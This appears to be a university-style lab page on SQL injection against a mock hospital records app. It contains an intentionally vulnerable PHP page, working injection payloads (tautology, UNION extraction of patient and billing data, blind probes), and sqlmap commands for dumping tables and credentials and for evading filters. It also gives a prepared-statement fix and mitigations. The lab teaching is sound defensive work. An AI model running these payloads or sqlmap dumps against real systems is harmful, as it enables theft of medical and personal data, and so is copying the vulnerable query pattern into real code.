---
title: Injection
sidebar_position: 5
---
# Injection

**Overview**  
SQL Injection (SQLi) is one of the oldest and most dangerous web application vulnerabilities. It occurs when an application includes untrusted input in an SQL query without proper validation or parameterization, allowing an attacker to alter the intended SQL command. In a lab context we use controlled vulnerable examples to learn how SQLi works, its impact, and how to prevent it.

> ⚠️ **Important:** This lab is for educational, legal, and controlled environments only. Do **not** apply these techniques against systems you do not own or do not have explicit permission to test.

---

## What is SQL Injection?

SQL Injection happens when user-supplied data is treated as part of an SQL statement. Instead of being handled as data, attacker input changes the structure of the SQL query that the database executes. Depending on the vulnerability and the database privileges, an attacker may be able to:

- Read sensitive data (exfiltrate)
- Bypass authentication
- Modify or delete data
- Execute administrative operations
- Pivot to other systems or escalate privileges

---

## Common SQLi Types

- **In-band (Classic)**
    - *Union-based:* use `UNION SELECT` to append attacker-controlled result sets to the application’s results.
    - *Error-based:* provoke database errors that leak information (column names, data types, query structure).
- **Blind SQLi**
    - *Boolean-based:* infer data by observing true/false responses from the application.
    - *Time-based:* infer data by causing the database to delay responses conditionally (e.g., `SLEEP()`).
- **Out-of-band (OOB)**
    - Use database features that make the DB server connect out to an attacker-controlled service (useful when direct responses are limited).

---

## Typical Consequences

- **Data disclosure / exfiltration:** Steal sensitive records (PHI, financial records, credentials).
- **Authentication bypass:** Log in as other users without knowing their password.
- **Data tampering:** Modify or delete records (medical data, billing).
- **Privilege escalation:** Execute admin-level commands or access restricted features.
- **Denial of Service (DoS):** Run expensive or blocking queries that exhaust DB resources.
- **Reconnaissance & pivoting:** Discover schema, tables, and columns to plan further attacks or lateral movement.

---

## Realistic Use Cases (relevant to this lab)

1. **Data disclosure / exfiltration (PHI & billing)**
    - Attacker extracts patient records and billing details from `patients` and `billing` tables. Consequences include privacy breach, regulatory fines (HIPAA / GDPR), and reputational damage.

2. **Authentication bypass**
    - Manipulate login queries to bypass credential checks (e.g., `OR '1'='1'`) and assume other users’ identities.

3. **Data modification / sabotage**
    - Change or delete clinical notes, lab results, or billing records to disrupt care or cover tracks.

4. **Reconnaissance for further exploitation**
    - Enumerate table and column names, data types, and relationships to plan targeted exfiltration or escalation.

5. **Out-of-band exfiltration**
    - When direct query responses are filtered, use OOB channels (e.g., DNS or HTTP callbacks) to leak data.

---

## Lab scope & structure

This lab is organized in **three parts** so students can learn step-by-step:

1. **Vulnerable code**
    - Inspect an intentionally vulnerable PHP page that constructs SQL queries by concatenating user input. You will see how input maps to SQL and how easy it is to manipulate.

2. **Secure solution**
    - Replace the vulnerable code with a safe implementation using parameterized queries (prepared statements), input handling, least-privilege DB accounts, and safer error handling.

3. **Introduction to sqlmap**
    - Learn how to use `sqlmap` (an automated SQLi tool) responsibly to detect and demonstrate SQLi vectors in a controlled lab. We will use `sqlmap` to enumerate tables, extract sample rows, and compare what `sqlmap` can automate vs. manual exploitation techniques.

> **Note:** The database schema and initial sample data used by this lab are described on the **Setup** page. Please make sure the environment is deployed exactly as shown on the Setup page before performing any exploitation steps.

---

## Detection & Mitigation (high-level)

**Detection indicators**
- Unusual or large SELECT queries from a single account or IP
- Repeated malformed queries or database errors in logs
- Rapid increases in exported/returned rows or bandwidth
- WAF/DB monitoring alerts for suspicious patterns (e.g., `%UNION%`, `SLEEP`, repeated quotes)

**Mitigation checklist**
- Use parameterized queries / prepared statements everywhere
- Validate and whitelist input where possible (deny-by-default)
- Use least-privilege database accounts (limit SELECT columns)
- Disable verbose DB error output to clients; log safely and redact PHI
- Implement DB activity monitoring and anomaly detection
- Apply a WAF as an additional layer (but don’t rely on it as sole protection)

---

# Vulnerable Code — Patient Lookup (Insecure)

---

## 1) Vulnerable PHP page (file: `patient_lookup.php`)

Save the following file in your web root (e.g., `/var/www/html/patient_lookup.php`):


```php
<?php
// patient_lookup.php
// Vulnerable demo for educational SQL Injection lab (Data disclosure)

// DB connection config - adjust to your environment
$DB_HOST = 'hostname';
$DB_USER = 'username';
$DB_PASS = 'password';         // set your password
$DB_NAME = 'dbname';
$DB_PORT = 3306;

// Connect (mysqli, procedural)
$conn = mysqli_connect($DB_HOST, $DB_USER, $DB_PASS, $DB_NAME, $DB_PORT);
if (!$conn) {
    die("DB connection error.");
}

// Get query parameter
$q = isset($_GET['q']) ? $_GET['q'] : '';

// --- Vulnerable SQL (UNSAFE) ---
$sql = "SELECT id, medical_record_number, first_name, last_name, dob, email FROM patients WHERE first_name LIKE '%$q%' OR last_name LIKE '%$q%' LIMIT 100;";

// Execute and show results
$result = mysqli_query($conn, $sql);

?>
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Patient Lookup (Vulnerable)</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; background:#f7f7f9; color:#222; }
    .card { background: white; border-radius:8px; padding:16px; box-shadow:0 2px 6px rgba(0,0,0,.08); max-width:900px; margin:auto; }
    table { width:100%; border-collapse: collapse; }
    th,td { padding:8px; border-bottom:1px solid #eee; text-align:left; }
    input[type="text"]{ padding:8px; width:60%; margin-right:8px; }
    button{ padding:8px 12px; }
    .danger{ color:#8b0000; font-weight:bold; }
  </style>
</head>
<body>
  <div class="card">
    <h2>Patient Lookup (VULNERABLE)</h2>
    <p class="danger">This page is intentionally vulnerable — for lab use only.</p>

    <form method="get" action="/patient_lookup.php">
      <input type="text" name="q" placeholder="Enter patient first/last name (e.g. John)" value="<?php echo htmlspecialchars($q); ?>" />
      <button type="submit">Search</button>
    </form>

    <hr/>

    <h3>Results</h3>

    <?php if ($result === false): ?>
      <div style="color: red;">Query error: <?php echo htmlspecialchars(mysqli_error($conn)); ?></div>
    <?php else: ?>
      <table>
        <thead>
          <tr>
            <th>#</th><th>MRN</th><th>First Name</th><th>Last Name</th><th>DOB</th><th>Email</th>
          </tr>
        </thead>
        <tbody>
          <?php while ($row = mysqli_fetch_assoc($result)): ?>
            <tr>
              <td><?php echo htmlspecialchars($row['id']); ?></td>
              <td><?php echo htmlspecialchars($row['medical_record_number']); ?></td>
              <td><?php echo htmlspecialchars($row['first_name']); ?></td>
              <td><?php echo htmlspecialchars($row['last_name']); ?></td>
              <td><?php echo htmlspecialchars($row['dob']); ?></td>
              <td><?php echo htmlspecialchars($row['email']); ?></td>
            </tr>
          <?php endwhile; ?>
        </tbody>
      </table>
    <?php endif; ?>

    <p style="margin-top:16px; font-size:0.9em; color:#555;">
      Note: the SQL query shown on the server is: <code><?php echo htmlspecialchars($sql); ?></code>
    </p>

  </div>
</body>
</html>
<?php
mysqli_close($conn);
```

## 2) Why this is vulnerable (brief)

- The script builds an SQL string by directly inserting the q parameter into the query (WHERE first_name LIKE '%$q%' ...).
- An attacker can inject characters (quotes, SQL keywords) that change the structure of the query.
- Because the application echoes the constructed SQL (debug), students can clearly see how payloads map to the executed query — useful for learning.


## 3) Step-by-step exploitation

> Perform these steps only in the lab environment described in Setup.

### Step 0 — Pre-check

- Ensure hospital_emr has sample data (patients & billing) inserted.
- Visit vulnerable page, e.g.:
http://127.0.0.1:8080/patient_lookup.php?q=John
You should see only matching rows for John.


### Step 1 — Basic tautology (discover behavior / get many rows)

Payload (in the search box):

```shell
' OR '1'='1
```

**What to do:**

* Enter the payload and submit.

**Expected effect:**

* The WHERE clause becomes effectively always true → many or all patient rows are returned (limited by LIMIT 100).
* Useful to show how simple input can bypass intended filters.

Why it works (example):
The query becomes (conceptually):
```sql
... WHERE first_name LIKE '%' OR '1'='1'%' OR last_name LIKE '%' OR '1'='1'%'
```
* This results in a tautology, returning many rows.

### Step 2 — Examine server-side SQL (mapping)

* Look at the Debug: the SQL executed... block printed on the page.
* Observe how your input was interpolated — this helps craft subsequent payloads.

### Step 3 — Union-based data extraction (in-band SQLi)

**Goal:** extract additional rows/columns (e.g., billing, other tables).

**Important:** The vulnerable query returns 6 columns (id, medical_record_number, first_name, last_name, dob, email). Any UNION SELECT must return the same number of columns and compatible types (or use fillers).

**Example payload (search box):**

```sql
' UNION SELECT 1, medical_record_number, first_name, last_name, dob, email FROM patients -- 
```

**Notes:**

* The leading single quote closes the literal; UNION SELECT ... appends rows.
* -- comments out the rest of the original query.
* If the page displays rows from patients, the UNION succeeded.

Extracting billing info (map billing columns into the 6 display columns):

```sql
' UNION SELECT id, CONCAT('BILL#',id), amount, currency, status, description FROM billing -- 
```

**Result:** Billing rows appear in the patients table display — demonstrating exfiltration to a UI that wasn't intended to show billing.

### Step 4 — Blind techniques (when errors suppressed)

If the app does not reveal SQL errors or you cannot use UNION, use blind methods:

**Boolean-based example:** check whether first letter of database version is '5'

```sql
' AND (SELECT SUBSTRING(VERSION(),1,1))='5' --
```

* Observe whether response changes (true/false) to infer values character by character.

Time-based example (MySQL):

* If the response is delayed, the tested condition is true.

> Blind techniques are slower but powerful when output is limited.


### Step 5 — OOB (Out-of-band) exfiltration (advanced / optional)

If direct responses are blocked but the database can make network calls (rare in default MySQL), use features (e.g., LOAD_FILE, OUTFILE, or DB-specific UDFs) or cause DNS/HTTP callbacks to an attacker-controlled server. Do not perform network exfiltration on shared lab networks. This is only for advanced/simulated labs.

```http request
curl "http://127.0.0.1:8080/patient_lookup.php?q=%27+UNION+SELECT+1%2C+medical_record_number%2C+first_name%2C+last_name%2C+dob%2C+email+FROM+patients+--+"
```


## Common pitfalls & hints for students

* Column count mismatch: If your UNION SELECT has the wrong number of columns, DB returns an error. Use ORDER BY n or trial NULL fillers (e.g., NULL, NULL) to find correct count.
* Data types: If a column expects number but you provide text, use type-compatible values (e.g., use 1 for numeric id columns or wrap strings in quotes).
* LIMIT hiding data: LIMIT 100 can hide rows; attack may need multiple queries or remove LIMIT via comment injection if possible.
* Escaped characters / filters: If the app escapes quotes or filters keywords, try alternative encodings or blind/time-based techniques.
* WAFs / detection: Basic WAFs may block naive payloads — teach how WAFs raise alerts and also how attackers try to evade them (but emphasize defenders should tune WAFs and monitoring).


# Secure Implementation — Patient Lookup (Fixed)

> **File:** `patient_lookup_fixed.php`  
> The file above is the fixed now you have to test the differences.

```php
<?php
// patient_lookup_fixed.php - safe version using prepared statements

$DB_HOST = 'hostname';
$DB_USER = 'username';
$DB_PASS = 'password';         // set your password
$DB_NAME = 'dbname';
$DB_PORT = 3306;

$conn = mysqli_connect($DB_HOST, $DB_USER, $DB_PASS, $DB_NAME, $DB_PORT);
if (!$conn) die("DB connection error.");

$q = isset($_GET['q']) ? trim($_GET['q']) : '';

// Use prepared statement and bind parameter
$sql = "SELECT id, medical_record_number, first_name, last_name, dob, email
        FROM patients
        WHERE first_name LIKE CONCAT('%', ?, '%') OR last_name LIKE CONCAT('%', ?, '%')
        LIMIT 100";

$stmt = mysqli_prepare($conn, $sql);
if ($stmt) {
    mysqli_stmt_bind_param($stmt, "ss", $q, $q);
    mysqli_stmt_execute($stmt);
    $res = mysqli_stmt_get_result($stmt);
} else {
    die("Prepare failed.");
}
?>
<!doctype html><html><head><meta charset="utf-8"><title>Patient Lookup (Fixed)</title></head>
<body>
  <h2>Patient Lookup (FIXED)</h2>
  <form><input name="q" value="<?php echo htmlspecialchars($q); ?>" /><button>Search</button></form>
  <table border="1">
    <tr><th>#</th><th>MRN</th><th>First</th><th>Last</th><th>DOB</th><th>Email</th></tr>
    <?php while ($row = mysqli_fetch_assoc($res)): ?>
      <tr>
        <td><?php echo htmlspecialchars($row['id']); ?></td>
        <td><?php echo htmlspecialchars($row['medical_record_number']); ?></td>
        <td><?php echo htmlspecialchars($row['first_name']); ?></td>
        <td><?php echo htmlspecialchars($row['last_name']); ?></td>
        <td><?php echo htmlspecialchars($row['dob']); ?></td>
        <td><?php echo htmlspecialchars($row['email']); ?></td>
      </tr>
    <?php endwhile; ?>
  </table>
</body></html>
<?php mysqli_close($conn); ?>
```

---

## Core security changes (high level)

1. **Use of Prepared Statements / Parameterized Queries**
    - The fixed implementation uses prepared statements (e.g., `mysqli_prepare()` / `PDO::prepare()`), binding user input as parameters instead of concatenating it into the SQL string.
    - **Why it helps:** Bound parameters are treated strictly as data — they cannot change the SQL syntax — which eliminates SQL Injection vectors.

2. **Safer `LIKE` usage with parameters**
    - Instead of building `'%$q%'` directly into SQL, the implementation uses `CONCAT('%', ?, '%')` (or binds `'%'.$q.'%'` as a parameter depending on the API) so the wildcard logic stays data-bound.
    - **Why it helps:** Prevents attackers from injecting quotes or `UNION` constructs inside the `LIKE` expression.

3. **Input normalization & basic validation**
    - Trim input, enforce a reasonable maximum length, and optionally restrict characters (e.g., block control characters). Use whitelist validation where applicable.
    - **Why it helps:** Limits attacker-controlled input size and avoids unexpected characters that may make exploitation easier or cause DoS.

4. **Least-privilege DB account**
    - The application uses a database user with only the permissions necessary (e.g., `SELECT` on specific columns/tables) rather than a high-privilege `root` account.
    - **Why it helps:** Even if SQLi were present, the attacker’s ability to read or modify data would be constrained by DB permissions.

5. **Remove or avoid debug SQL exposure**
    - The fixed version does **not** print the full interpolated SQL to the page. Debugging information is logged to server-side logs (with redaction) when needed, not echoed to clients.
    - **Why it helps:** Avoids giving attackers direct insight into query structure and helps prevent information leakage.

6. **Safe error handling & logging**
    - Catch/handle DB errors gracefully. Return user-friendly messages (e.g., “No results found”) and write detailed errors to server logs that are protected and redacted for PHI.
    - **Why it helps:** Prevents error-based injection discovery and protects sensitive data from being logged in plain text.

7. **Limit returned columns & pagination**
    - Query only the columns required for the view (avoid `SELECT *`). Keep `LIMIT` and add pagination controls to restrict bulk exfiltration in normal operation.
    - **Why it helps:** Reduces attack surface and the amount of data an attacker can retrieve in one query.

8. **Monitoring & alerting hooks**
    - Add server-side checks to log anomalous query patterns (large result sets, repeated unusual parameters) and integrate with DB activity monitoring or WAF telemetry.
    - **Why it helps:** Improves detection of attempted exploits and enables faster incident response.

---

## What to test after deploying the fixed code

1. **Functionality tests**
    - Normal searches (e.g., `John`, `Jane`) still return expected results.
    - Pagination and result limits behave correctly.

2. **Security tests (lab environment)**
    - Re-run the earlier SQLi payloads used against the vulnerable page (e.g., `' OR '1'='1`, `UNION SELECT ...`) and confirm they **no longer** modify query logic or return unexpected rows.
    - Test blind/time-based payloads; responses should not change to reveal data.
    - Confirm that supplying very long input strings is handled (max length enforced).

3. **Error handling & logging**
    - Trigger a controlled DB error (in a safe way) and confirm the user-facing message is generic while the detailed error is written to a protected log (with no PHI).

4. **Permission validation**
    - Verify the DB user used by the application cannot perform actions beyond its needs (no `DROP`, `INSERT`, `UPDATE` if not required).
    - Attempt queries that would require elevated privileges and confirm they fail with permission errors for the app user.

5. **Regression checks**
    - Ensure the fixed code still meets performance expectations and does not introduce latency when binding parameters.

---



# SQLMap Lab — Automated SQL Injection with `sqlmap`


This section shows how to use **sqlmap** to discover and exploit the SQL Injection vulnerability in the vulnerable `patient_lookup.php` lab page.  
It starts from installation, moves to discovery, enumeration, targeted extraction (patients & billing), and concludes with guidance on interpreting results and safe practices.

---

## Lab assumptions & target

- Vulnerable page (lab): `http://127.0.0.1:8080/patient_lookup.php?q=John`
- Database: `hospital_emr` (schema and sample data already prepared in the **Setup** page)
- You run commands on the lab host (Linux/macOS/Windows WSL) with `python3` and `pip` available.

---

## 1 — Install sqlmap

### Option A — via `pip` (portable)
```bash
python3 -m pip install --user sqlmap
# ensure ~/.local/bin is in PATH if installed with --user
```


### Option B — clone latest from GitHub (recommended for newest features)

```bach
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
# run via: python3 sqlmap.py ...
```


## 2 — Safe discovery (non-destructive)

Start with a low-risk check to see if q is injectable (no dumping):

```bash
sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=John" --batch --level=1 --risk=1 --technique=BE --threads=2
```

* --level / --risk control intensity (begin low).
* --technique=BE limits checks to Boolean & Error types.
* --batch auto-answers prompts for automation.

**Expected:** sqlmap reports whether it found an injectable parameter and which technique succeeded.

## 3 — Force probing the q parameter

Let sqlmap probe the q parameter explicitly:
```bash
sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" --batch --level=2 --risk=1
```
* Use q=* to instruct sqlmap to test that parameter.

## 4 — Enumerate databases / users

Once injection is confirmed, enumerate DBs and users:

* sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" --dbs --batch
* sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" --current-db --batch
* sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" --users --passwords --batch

**Goal:** confirm hospital_emr exists and inspect DB users (lab only).

## 5 — List tables in hospital_emr

```bash
sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" -D hospital_emr --tables --batch
```
You should see tables such as patients, billing, appointments, etc.

## 6 — List columns for a table (example: patients)

```bash
sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" -D hospital_emr -T patients --columns --batch
```
This reveals column names and types (e.g., id, medical_record_number, first_name, last_name, dob, email).

## 7 — Dump table data (targeted extraction)
Dump entire table (lab only):

```bash
sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" -D hospital_emr -T patients --dump --batch
```

Dump specific columns only (recommended for focused demo):

```bash
sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" -D hospital_emr -T patients -C "medical_record_number,first_name,last_name,email" --dump --batch
```

Dump rows with a WHERE clause:

```bash
sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" -D hospital_emr -T patients --where="email LIKE '%@example.test'" --dump --batch
```

Dump billing table (exfiltration demo):
```bash
sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" -D hospital_emr -T billing --dump --batch
```

**Notes:**
* --dump extracts and saves data in sqlmap's output folder (check path in sqlmap output).
* Use -C to limit columns and reduce noise.


## 8 — If the site uses POST (form) instead of GET

Simulate POST body with --data:

```bash
sqlmap -u "http://127.0.0.1:8080/patient_lookup.php" --data="q=John" -p q --batch
```
* -p q tells sqlmap to focus on parameter q.
* Use --data for POST targets.

## 9 — Advanced options & practical tips

* Increase depth for more aggressive tests:
```bahs
sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" --level=5 --risk=3 --batch
```
* Use tamper scripts if basic payloads are filtered (only in lab):
```bash
sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" --tamper=between,randomcase --batch
```
* Set custom headers / cookies if the app requires authentication:
```bash
sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" --headers="User-Agent: sqlmap" --cookie="SESSION=abcd" --batch
```
* Threads for speed:
```bash
sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" --threads=5 --batch
```
* Specify output directory:
```bash
sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" --output-dir=./sqlmap-output --batch
```


## 10 — Interpreting sqlmap output

* Injection confirmation: sqlmap prints which parameter and which technique succeeded (e.g., Parameter: q (GET) — Type: UNION query).
* Database listing / tables / columns: outputs are printed and saved under sqlmap output directory.
* Dump results: data is shown in terminal and saved to files (CSV/TXT) — use these files for lab reports.
* Logs: check sqlmap verbose output for payloads used — useful to teach how exploitation maps to manual payloads.


## 11 — When UNION fails: use blind or time-based options

Boolean-based (slower, less noisy):

```bash
sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" --technique=B --batch
```

Time-based:

```bash
sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" --technique=T --sleep=3 --batch
```

## 12 — Safety, etiquette & cleanup
* Safety: Never run sqlmap against production services or external targets without written permission. This lab must be isolated (use local VM or container).
* Rate & resource caution: Aggressive scans can disrupt your DB server. Use --level/--risk conservatively and avoid --threads that overwhelm the server.
* Network & logs: sqlmap may generate many requests — review web server logs and DB logs after testing to demonstrate forensic traces.
* Cleanup: After the lab, remove extracted files from the host if they contain sensitive sample data:

```bash
rm -rf ~/.local/share/sqlmap/output/*
# or the output dir you specified
```

## 13 — Verifying fix (post-remediation)
After you deploy patient_lookup_fixed.php (prepared statements), validate that sqlmap can no longer exploit the parameter:

```bash
sqlmap -u "http://127.0.0.1:8080/patient_lookup_fixed.php?q=*" --batch --level=2 --risk=1
```

**Expected:** sqlmap should not confirm injection; attempts to dump should fail or produce no results.




# Mini Project — Login Page: Vulnerable & Fixed (Final Instructions)

**Objective (short):**  
Implement two login page for the `Hospital` lab — one **vulnerable** to SQL Injection and one **fixed**. 
Attack the vulnerable version (manually and with tools) to **bypass the login** and to **retrieve sensitive information** from the web application. 
Produce a single PDF that contains everything and submit it.


---

## What students must do (concise)

1. Build / deploy both pages in the lab environment:
    - `login_vuln.php` — intentionally vulnerable version.
    - `login_fixed.php` — secure version using prepared statements and safe error handling.

2. Using **manual techniques** and **sqlmap** (or similar), attempt to:
    - **Bypass the login** (e.g., authenticate as another user).
    - **Retrieve sensitive data** accessible through the application (examples: user list, patient identifiers, billing rows, etc.).
    - Explore other information exposed by the site (pages, endpoints, or debug output).

3. Collect **all evidence** of your work (payloads, command lines, outputs, screenshots, notes).

---

## Submission (single PDF only)

Create **one** PDF file and submit it via the Google Form link below (demo — replace later):  
**https://docs.google.com/forms/d/e/1FAIpQLSfy5WQdFYPU28b84C4wR7wW4SyCi_1S6q9KRgrHi1Sj3vLQwA/viewform?usp=header**

